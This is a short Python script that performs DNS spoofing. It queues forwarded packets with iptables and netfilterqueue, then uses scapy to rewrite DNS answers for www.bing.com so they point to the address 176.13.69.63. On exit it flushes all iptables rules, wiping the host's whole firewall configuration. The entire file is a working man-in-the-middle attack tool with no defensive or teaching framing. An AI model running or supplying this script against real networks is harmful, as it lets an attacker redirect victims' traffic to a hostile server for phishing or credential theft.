import netfilterqueue
import subprocess
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname = qname, rdata="176.13.69.63")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))

    packet.accept()
try:
    while True:
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0,process_packet)
        queue.run()

except KeyboardInterrupt:
    print("Flushing Iptable")
    subprocess.call(["iptables","--flush"])

